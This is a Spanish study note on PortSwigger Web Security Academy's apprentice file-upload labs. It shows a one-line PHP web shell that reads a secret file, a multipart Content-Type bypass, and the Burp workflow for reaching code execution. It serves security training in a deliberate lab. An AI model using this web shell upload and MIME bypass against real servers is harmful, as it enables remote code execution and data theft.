# 05 — File Upload Vulnerabilities

> **Método de estudio:** seguir primero el orden, conceptos y workflows oficiales de PortSwigger Web Security Academy. Los bypasses avanzados, payload collections y atajos de examen quedan separados en `Preparacion-Examen/`.

## Estado del bloque

**✅ File Upload Vulnerabilities — Apprentice completado.**

Labs realizados:

- ✅ Remote code execution via web shell upload.
- ✅ Web shell upload via Content-Type restriction bypass.

---

## Qué son las vulnerabilidades de File Upload

Una vulnerabilidad de **file upload** aparece cuando una aplicación permite subir archivos al servidor sin validar correctamente aspectos como nombre, extensión, tipo MIME, contenido, tamaño, ubicación final o si el servidor ejecutará el archivo.

El riesgo más grave es:

```text
usuario sube archivo
        ↓
servidor lo guarda
        ↓
archivo queda accesible
        ↓
servidor lo interpreta como código
        ↓
Remote Code Execution
```

---

# Orden oficial en Server-side vulnerabilities — Apprentice

1. What are file upload vulnerabilities?
2. How do file upload vulnerabilities arise?
3. Exploiting unrestricted file uploads to deploy a web shell
4. **Lab: Remote code execution via web shell upload**
5. Exploiting flawed validation of file uploads
6. Flawed file type validation
7. Flawed file type validation — Continued
8. Flawed file type validation — Continued
9. **Lab: Web shell upload via Content-Type restriction bypass**

---

# Lab 1 — Remote code execution via web shell upload ✅

> [Procedimiento completo](../Labs/File-Upload/01-RCE-via-web-shell-upload.md)

Payload usado por PortSwigger:

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

Workflow aprendido:

```text
Upload exploit.php
      ↓
/files/avatars/exploit.php
      ↓
GET al archivo
      ↓
servidor ejecuta PHP
      ↓
secret de Carlos
```

La lección principal fue distinguir:

```text
archivo subido correctamente
≠
archivo ejecutado correctamente
```

---

# Lab 2 — Web shell upload via Content-Type restriction bypass ✅

> [Procedimiento completo](../Labs/File-Upload/02-Web-shell-via-Content-Type-bypass.md)

La aplicación valida el MIME declarado por el cliente.

Request rechazada conceptualmente:

```http
Content-Disposition: form-data; name="avatar"; filename="exploit.php"
Content-Type: application/x-php
```

Bypass oficial:

```http
Content-Disposition: form-data; name="avatar"; filename="exploit.php"
Content-Type: image/jpeg
```

El nombre siguió siendo:

```text
exploit.php
```

Luego se solicitó:

```text
/files/avatars/exploit.php
```

para ejecutar el PHP y recuperar el secret.

---

# Multipart/form-data aprendido

Debemos distinguir dos niveles de `Content-Type`.

## Request completa

```http
Content-Type: multipart/form-data; boundary=...
```

## Parte del archivo

```http
Content-Disposition: form-data; name="avatar"; filename="exploit.php"
Content-Type: image/jpeg
```

En el segundo lab modificamos **el Content-Type de la parte del archivo**, no el `multipart/form-data` global.

---

# Qué aprendimos en Burp

- `Proxy → HTTP history`;
- localizar `POST /my-account/avatar`;
- leer `multipart/form-data`;
- reconocer `filename=`;
- reconocer el MIME de la parte del archivo;
- `Send to Repeater`;
- modificar solamente el MIME relevante;
- localizar/crear `GET /files/avatars/exploit.php`;
- interpretar la Response de ejecución.

---

# Método mental

```text
¿puedo subir un archivo?
        ↓
¿qué valida el servidor?
        ↓
¿ese dato lo controla el cliente?
        ↓
¿dónde queda almacenado?
        ↓
¿es accesible por URL?
        ↓
¿el servidor lo ejecuta o solo lo sirve como datos?
```

---

# Checklist Apprentice

- [x] Entiendo qué es una vulnerabilidad de file upload.
- [x] Entiendo qué significa web shell.
- [x] Entiendo por qué un `.php` puede producir RCE.
- [x] Sé leer una request `multipart/form-data`.
- [x] Entiendo que el `Content-Type` declarado es controlable por el cliente.
- [x] Sé usar Repeater para modificar el MIME de una parte multipart.
- [x] Sé encontrar y solicitar el archivo subido.
- [x] Distingo upload exitoso de ejecución exitosa.
- [x] Lab 1 completado.
- [x] Lab 2 completado.

---

# Registro de labs

## Lab 1 — Remote code execution via web shell upload

- Estado: ✅ resuelto.
- Concepto: upload sin restricciones + ejecución PHP.

## Lab 2 — Web shell upload via Content-Type restriction bypass

- Estado: ✅ resuelto.
- Concepto: validación débil basada en MIME controlable por el cliente.

---

# Regla rápida

**En File Upload no basta con preguntar “¿me deja subirlo?”. Hay que comprobar qué valida, dónde lo guarda y qué hace el servidor cuando solicitamos ese archivo.**
